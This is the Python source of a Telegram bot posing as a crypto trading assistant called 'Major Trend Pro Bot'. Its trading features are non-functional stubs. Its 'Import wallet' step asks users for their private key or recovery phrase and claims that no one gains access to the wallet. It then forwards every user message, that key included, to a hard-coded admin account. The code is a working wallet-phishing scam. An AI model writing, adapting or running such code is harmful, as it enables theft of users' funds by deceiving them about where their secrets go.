import html
import json
import os
import re
import requests
import signal
import sys
import time
import traceback
from collections import deque

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_ID = 8463629333
BOT_USERNAME = "majortrendprobot"
API_BASE = f"https://api.telegram.org/bot{TOKEN}" if TOKEN else ""

running = True
user_states = {}
admin_reply_targets = {}
processed_updates = set()
processed_messages = set()
processed_update_order = deque(maxlen=3000)
processed_message_order = deque(maxlen=3000)
recent_starts = {}

WELCOME_MESSAGE = """<b>What can this bot do?</b>

Automate your trading experience with Major Trend Pro Bot receive personalized market analysis, trading signals and notification to help you stay ahead of the market
Get real-time crypto market updates, trading signals and insight delivered directly to your telegram our bot provides timely alert price tracking and more
☆fast
☆safe
☆reliable"""

MAIN_MENU_TEXT = "🔝 <b>Main Menu</b>"

MENU_BUTTONS = {
    "🔙 Back": "main_menu",
    "Back": "main_menu",
    "🔝 Main Menu": "main_menu",
    "Main Menu": "main_menu",
    "🚫 Cancel": "main_menu",
    "Cancel": "main_menu",
    "💰 Buy": "buy",
    "Buy": "buy",
    "🐝 Sell": "sell",
    "Sell": "sell",
    "🔐 Import wallet": "import_wallet",
    "Import wallet": "import_wallet",
    "🏦 Add assets": "add_assets",
    "Add assets": "add_assets",
    "💳 Wallet balance": "wallet_balance",
    "Wallet balance": "wallet_balance",
    "👜 Wallet management": "wallet_management",
    "Wallet management": "wallet_management",
    "🏦 Portfolio": "portfolio",
    "Portfolio": "portfolio",
    "👥 Copy trading": "copy_trading",
    "Copy trading": "copy_trading",
    "📌 Limit order": "limit_order",
    "Limit order": "limit_order",
    "🏆 Refer and earn": "refer_and_earn",
    "Refer and earn": "refer_and_earn",
    "🏛 Help": "help",
    "Help": "help",
    "📡 Signals": "signals",
    "Signals": "signals",
    "🌐 Language": "language",
    "Language": "language",
    "⚙️ Settings": "settings",
    "Settings": "settings",
}

COMING_SOON_CALLBACKS = {
    "switch_wallet",
    "export_key",
    "find_traders",
    "my_copy_trades",
    "settings_notifications",
    "settings_slippage",
    "settings_gas",
    "settings_security",
    "lang_en",
    "lang_zh",
    "lang_es",
    "lang_fr",
}


def request(method, payload=None, timeout=35):
    if not TOKEN:
        raise RuntimeError("TELEGRAM_BOT_TOKEN is not set")

    try:
        response = requests.post(f"{API_BASE}/{method}", json=payload, timeout=timeout)
        if response.status_code == 401:
            print("Telegram rejected the bot token. Put the new token in Replit Secrets as TELEGRAM_BOT_TOKEN.", flush=True)
        response.raise_for_status()
        result = response.json()
    except requests.RequestException as error:
        raise RuntimeError(f"Telegram request failed: {error}")
    except json.JSONDecodeError as error:
        raise RuntimeError(f"Telegram returned invalid JSON: {error}")

    if not result.get("ok"):
        raise RuntimeError(result)
    return result.get("result")


def send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    payload = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    if parse_mode:
        payload["parse_mode"] = parse_mode
    return request("sendMessage", payload)


def copy_message(chat_id, from_chat_id, message_id):
    return request("copyMessage", {"chat_id": chat_id, "from_chat_id": from_chat_id, "message_id": message_id})


def answer_callback_query(callback_query_id):
    try:
        request("answerCallbackQuery", {"callback_query_id": callback_query_id}, timeout=10)
    except Exception as error:
        print(f"answerCallbackQuery failed: {error}", flush=True)


def main_keyboard():
    return {
        "keyboard": [
            [{"text": "💰 Buy"}, {"text": "🐝 Sell"}],
            [{"text": "🔐 Import wallet"}, {"text": "🏦 Add assets"}, {"text": "💳 Wallet balance"}],
            [{"text": "👜 Wallet management"}, {"text": "🏦 Portfolio"}],
            [{"text": "👥 Copy trading"}, {"text": "📌 Limit order"}],
            [{"text": "🏆 Refer and earn"}, {"text": "🏛 Help"}],
            [{"text": "📡 Signals"}, {"text": "🌐 Language"}],
            [{"text": "⚙️ Settings"}],
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False,
    }


def back_keyboard():
    return {
        "keyboard": [
            [{"text": "🔙 Back"}, {"text": "🔝 Main Menu"}],
            [{"text": "🚫 Cancel"}],
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False,
    }


def cancel_keyboard():
    return {
        "keyboard": [[{"text": "🚫 Cancel"}]],
        "resize_keyboard": True,
        "one_time_keyboard": False,
    }


def inline_keyboard(rows):
    return {"inline_keyboard": rows}


def get_chat_id(message):
    return message.get("chat", {}).get("id")


def get_user(message):
    return message.get("from", {})


def remember(key, seen_set, order):
    if key in seen_set:
        return False
    if len(order) == order.maxlen:
        old_key = order.popleft()
        seen_set.discard(old_key)
    seen_set.add(key)
    order.append(key)
    return True


def forward_to_admin(user, text, message_type="text"):
    try:
        user_id = user.get("id")
        if not user_id or user_id == ADMIN_ID:
            return

        first_name = html.escape(user.get("first_name") or "Unknown")
        username = html.escape(user.get("username") or "no_username")
        safe_type = html.escape(message_type)
        safe_text = html.escape(text or "[non-text message]")
        message = (
            f"👤 <b>User:</b> {first_name} (@{username})\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"📝 <b>Type:</b> {safe_type}\n\n"
            f"💬 <b>Message:</b>\n{safe_text}\n\n"
            "↩️ Reply to this message to answer the user."
        )
        sent = send_message(ADMIN_ID, message)
        admin_reply_targets[sent["message_id"]] = user_id
        if len(admin_reply_targets) > 1000:
            oldest_key = next(iter(admin_reply_targets))
            del admin_reply_targets[oldest_key]
    except Exception as error:
        print(f"Failed to forward message to admin: {error}", flush=True)


def get_admin_reply_target(message):
    replied = message.get("reply_to_message")
    if not replied:
        return None

    message_id = replied.get("message_id")
    if message_id in admin_reply_targets:
        return admin_reply_targets[message_id]

    source_text = replied.get("text") or replied.get("caption") or ""
    match = re.search(r"ID:\s*(\d{5,})", source_text)
    return int(match.group(1)) if match else None


def handle_admin_reply(message):
    target_user_id = get_admin_reply_target(message)
    if not target_user_id:
        send_message(ADMIN_ID, "Could not find the user for this reply. Reply directly to a forwarded user message from the bot.", parse_mode=None)
        return

    try:
        if message.get("text"):
            send_message(target_user_id, message["text"], parse_mode=None)
        else:
            copy_message(target_user_id, ADMIN_ID, message["message_id"])
        send_message(ADMIN_ID, f"✅ Reply sent to user ID {target_user_id}.", parse_mode=None)
    except Exception as error:
        send_message(ADMIN_ID, f"❌ Could not send reply to user ID {target_user_id}: {error}", parse_mode=None)


def show_main_menu(chat_id):
    user_states[chat_id] = None
    send_message(chat_id, MAIN_MENU_TEXT, main_keyboard())


def handle_menu(chat_id, user, action):
    forward_to_admin(user, f"Button: {action}", "button")

    if action == "main_menu":
        show_main_menu(chat_id)
    elif action == "buy":
        user_states[chat_id] = "awaiting_buy_ca"
        send_message(chat_id, "Enter the token CA {contact address}", cancel_keyboard(), parse_mode=None)
    elif action == "sell":
        user_states[chat_id] = "awaiting_sell_ca"
        send_message(chat_id, "Enter the token CA {contact address} you want to sell", cancel_keyboard(), parse_mode=None)
    elif action == "import_wallet":
        user_states[chat_id] = "awaiting_wallet_import"
        send_message(chat_id, "Please enter the private key or recovery phrase to your wallet to import wallet.\n\nNOTE: 🙈 no one gained access to your wallet.", cancel_keyboard(), parse_mode=None)
    elif action == "add_assets":
        user_states[chat_id] = "awaiting_asset"
        send_message(chat_id, "🏦 <b>Add Assets</b>\n\nEnter the token contract address to add to your portfolio.", cancel_keyboard())
    elif action == "wallet_balance":
        send_message(chat_id, "💳 <b>Wallet Balance</b>\n\n💰 SOL: 0.00\n💰 ETH: 0.00\n💰 BNB: 0.00\n💰 BASE: 0.00\n\nNo wallet connected. Import a wallet first.", back_keyboard())
    elif action == "wallet_management":
        send_message(chat_id, "👜 <b>Wallet Management</b>\n\nManage your connected wallets, switch between wallets, or import a new one.", inline_keyboard([
            [{"text": "🔐 Import New Wallet", "callback_data": "import_wallet"}],
            [{"text": "🔄 Switch Wallet", "callback_data": "switch_wallet"}],
            [{"text": "🔑 Export Private Key", "callback_data": "export_key"}],
        ]))
        send_message(chat_id, MAIN_MENU_TEXT, back_keyboard())
    elif action == "portfolio":
        send_message(chat_id, "🏦 <b>Portfolio</b>\n\n📊 Your portfolio is empty.\n\nStart trading to see your holdings here.", back_keyboard())
    elif action == "copy_trading":
        send_message(chat_id, "👥 <b>Copy Trading</b>\n\nCopy the trades of successful traders automatically.\n\n• Follow top traders\n• Auto-mirror their trades\n• Set your own risk limits\n• Real-time notifications", inline_keyboard([
            [{"text": "🔍 Find Traders", "callback_data": "find_traders"}],
            [{"text": "📋 My Copy Trades", "callback_data": "my_copy_trades"}],
        ]))
        send_message(chat_id, MAIN_MENU_TEXT, back_keyboard())
    elif action == "limit_order":
        user_states[chat_id] = "awaiting_limit_ca"
        send_message(chat_id, "📌 <b>Limit Order</b>\n\nEnter the token CA {contact address} to set a limit order.", cancel_keyboard())
    elif action == "refer_and_earn":
        send_message(chat_id, f"🔗 Invite link: https://t.me/{BOT_USERNAME}?start=ref{user.get('id')}\n\n💵 Withdrawable: 0 ($0)(0 pending)\n💰 Total withdrawn: 0 ($0)\n👥 Total invited: 0 people\n💳 Receiving address: null\n\n📖 Rules:\n1. Earn 25% of invitees' trading fees permanently\n2. Withdrawals start from 0.01, max 1 request per 24h. Withdrawals will be auto triggered at 8:00 (UTC+8) daily and will be credited within 24 hours after triggering.", back_keyboard(), parse_mode=None)
    elif action == "help":
        send_message(chat_id, "✨ How it works\n1. Pick how much volume\n2. Pick how long to run\n3. Done! We handle the rest\n\n🧰 Tools:\nPUMP, VOLUME BOOST\n🔗 CONNECT, BALANCE\nSUPPORT !\n\n💧 Supported pools:\n• Pump.fun • Pumpswap\n• Radium • moon-it\n• Moonshot • Launch Lap\n• Jupiter • Dex\n\n🌍 DISCLAIMER.", back_keyboard(), parse_mode=None)
    elif action == "signals":
        send_message(chat_id, "Get the latest trade signals and alerts!\n🎯\n- Receive real-time trade signals and notifications\n- Stay updated on market trends and opportunities\n- Make informed trading decisions with timely alerts 💡", back_keyboard(), parse_mode=None)
    elif action == "language":
        send_message(chat_id, "🌐 <b>Language Settings</b>\n\nSelect your preferred language:", inline_keyboard([
            [{"text": "🇬🇧 English", "callback_data": "lang_en"}, {"text": "🇨🇳 Chinese", "callback_data": "lang_zh"}],
            [{"text": "🇪🇸 Spanish", "callback_data": "lang_es"}, {"text": "🇫🇷 French", "callback_data": "lang_fr"}],
        ]))
        send_message(chat_id, MAIN_MENU_TEXT, back_keyboard())
    elif action == "settings":
        send_message(chat_id, "⚙️ <b>Settings</b>\n\nConfigure your bot preferences:", inline_keyboard([
            [{"text": "🔔 Notifications", "callback_data": "settings_notifications"}],
            [{"text": "💰 Default Slippage", "callback_data": "settings_slippage"}],
            [{"text": "⛽ Gas Settings", "callback_data": "settings_gas"}],
            [{"text": "🔒 Security", "callback_data": "settings_security"}],
        ]))
        send_message(chat_id, MAIN_MENU_TEXT, back_keyboard())


def handle_state_message(chat_id, text, state):
    escaped_text = html.escape(text)
    user_states[chat_id] = None

    if state == "awaiting_buy_ca":
        send_message(chat_id, f"✅ Token CA received: <code>{escaped_text}</code>\n\n📊 Fetching token info...\n\nThis feature is being set up. Stay tuned!", back_keyboard())
    elif state == "awaiting_sell_ca":
        send_message(chat_id, f"✅ Sell order for: <code>{escaped_text}</code>\n\n📊 Processing...\n\nThis feature is being set up. Stay tuned!", back_keyboard())
    elif state == "awaiting_wallet_import":
        send_message(chat_id, "✅ Wallet import request received.\n\nNOTE: 🙈 no one gained access to your wallet.\n\nThis feature is being set up. Stay tuned!", back_keyboard(), parse_mode=None)
    elif state == "awaiting_asset":
        send_message(chat_id, f"✅ Asset CA received: <code>{escaped_text}</code>\n\nAdding to portfolio...\n\nThis feature is being set up. Stay tuned!", back_keyboard())
    elif state == "awaiting_limit_ca":
        send_message(chat_id, f"✅ Limit order CA received: <code>{escaped_text}</code>\n\nSetting up limit order...\n\nThis feature is being set up. Stay tuned!", back_keyboard())


def handle_message(message):
    chat_id = get_chat_id(message)
    user = get_user(message)
    text = message.get("text") or ""
    message_key = f"{chat_id}:{message.get('message_id')}"

    if not remember(message_key, processed_messages, processed_message_order):
        return

    if user.get("id") == ADMIN_ID and message.get("reply_to_message"):
        handle_admin_reply(message)
        return

    if text.startswith("/start"):
        now = time.time()
        if now - recent_starts.get(chat_id, 0) < 8:
            return
        recent_starts[chat_id] = now
        user_states[chat_id] = None
        send_message(chat_id, WELCOME_MESSAGE, main_keyboard())
        forward_to_admin(user, "/start", "command")
        return

    if text.startswith("/menu"):
        show_main_menu(chat_id)
        return

    action = MENU_BUTTONS.get(text)
    if action:
        user_states[chat_id] = None
        handle_menu(chat_id, user, action)
        return

    state = user_states.get(chat_id)
    forward_to_admin(user, text, state or "text")

    if state:
        handle_state_message(chat_id, text, state)
    elif chat_id != ADMIN_ID:
        show_main_menu(chat_id)


def handle_callback(callback_query):
    answer_callback_query(callback_query["id"])
    message = callback_query.get("message", {})
    chat_id = get_chat_id(message)
    user = callback_query.get("from", {})
    data = callback_query.get("data")

    if data in COMING_SOON_CALLBACKS:
        forward_to_admin(user, f"Button: {data}", "button")
        send_message(chat_id, "⚙️ This feature is coming soon!", back_keyboard(), parse_mode=None)
    else:
        handle_menu(chat_id, user, data)


def handle_update(update):
    update_id = update.get("update_id")
    if update_id is not None and not remember(update_id, processed_updates, processed_update_order):
        return

    if "message" in update:
        handle_message(update["message"])
    elif "callback_query" in update:
        handle_callback(update["callback_query"])


def shutdown(signum, frame):
    global running
    running = False
    print("Bot is shutting down gracefully...", flush=True)


def clear_pending_updates():
    try:
        request("deleteWebhook", {"drop_pending_updates": True}, timeout=10)
        print("Cleared old pending Telegram updates.", flush=True)
    except Exception as error:
        print(f"Could not clear pending updates: {error}", flush=True)


def main():
    global running
    signal.signal(signal.SIGTERM, shutdown)
    signal.signal(signal.SIGINT, shutdown)

    if not TOKEN:
        print("TELEGRAM_BOT_TOKEN is not set. Add your new bot token in Replit Secrets with the name TELEGRAM_BOT_TOKEN.", flush=True)
        sys.exit(1)

    clear_pending_updates()
    print("Python Telegram bot started successfully and is polling for messages...", flush=True)

    offset = None
    last_heartbeat = time.time()

    while running:
        try:
            payload = {"timeout": 30, "allowed_updates": ["message", "callback_query"]}
            if offset is not None:
                payload["offset"] = offset

            updates = request("getUpdates", payload, timeout=40)
            for update in updates:
                offset = update["update_id"] + 1
                try:
                    handle_update(update)
                except Exception:
                    traceback.print_exc()

            if time.time() - last_heartbeat > 300:
                print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Bot is alive.", flush=True)
                last_heartbeat = time.time()
        except Exception:
            traceback.print_exc()
            if running:
                time.sleep(5)


if __name__ == "__main__":
    main()

